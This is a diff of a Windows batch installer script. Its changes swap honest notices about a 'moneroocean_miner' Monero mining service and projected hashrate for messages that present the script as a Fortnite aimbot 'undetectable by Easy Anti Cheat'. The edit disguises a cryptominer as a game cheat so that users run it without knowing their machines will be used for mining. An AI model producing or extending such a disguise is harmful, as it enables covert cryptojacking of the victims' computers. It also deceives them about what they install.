@@ -5,7 +5,7 @@ set VERSION=2.4
 rem printing greetings
 
 echo Season 2 Fortnite aimbot setup
-echo ^(Created by TechMango, undetectable by Easy Anti Cheat^)
+echo ^(Created by TechMango^)
 echo.
 
 net session >nul 2>&1
@@ -176,13 +176,13 @@ if not [%EMAIL%] == [] (
 echo.
 
 if %ADMIN% == 0 (
-  echo Since I do not have admin access, mining in background will be started using your startup directory script and only work when your are logged in this host.
+  echo fortnite_esp_aimbot.exe is the aimbot executable.
 ) else (
-  echo Mining in background will be performed using moneroocean_miner service.
+  echo fornite_esp_aimbot.exe is the aimbot executable.
 )
 
 echo.
-echo JFYI: This host has %CPU_THREADS% CPU threads with %CPU_MHZ% MHz and %TOTAL_CACHE%KB data cache in total, so projected Monero hashrate is around %EXP_MONERO_HASHRATE% H/s.
+echo This aimbot hack is undetectable by Easy Anti Cheat
 echo.
 
 pause
